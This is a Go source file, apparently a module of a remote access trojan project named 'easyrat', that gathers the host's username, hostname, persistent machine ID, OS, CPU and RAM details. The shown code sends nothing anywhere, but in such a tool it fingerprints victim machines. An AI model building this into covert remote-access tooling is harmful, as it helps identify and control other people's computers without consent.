package modules

import (
	"easyrat/utils/types"
	"fmt"
	"os"
	"os/user"
	"runtime"

	"github.com/denisbrodbeck/machineid"
	"github.com/jaypipes/ghw"
)

func DeviceInfo() types.DeviceInfoStruct {
	dev_info := types.DeviceInfoStruct{}

	// User information
	user, err := user.Current()
	if err != nil {
		fmt.Printf("Error getting user info: %v", err)
	}

	hostname, err := os.Hostname()
	if err != nil {
		fmt.Printf("Error getting hostname info: %v", err)
	}

	machine_id, err := machineid.ID()
	if err != nil {
		fmt.Printf("Error getting hostname info: %v", err)
	}

	dev_info.HostName = hostname
	dev_info.UserName = user.Username
	dev_info.MachineID = machine_id

	// OS information
	dev_info.OSName = runtime.GOOS
	dev_info.Arch = runtime.GOARCH

	// CPU Information
	cpu, err := ghw.CPU()
	if err != nil {
		fmt.Printf("Error getting CPU info: %v", err)
	}

	dev_info.CPUCores = cpu.TotalCores
	dev_info.CPUThreads = cpu.TotalThreads

	// RAM Information
	memory, err := ghw.Memory()
	if err != nil {
		fmt.Printf("Error getting RAM info: %v", err)
	}
	dev_info.RAMUsable = memory.TotalUsableBytes
	dev_info.RAMPhysical = memory.TotalPhysicalBytes

	return dev_info
}
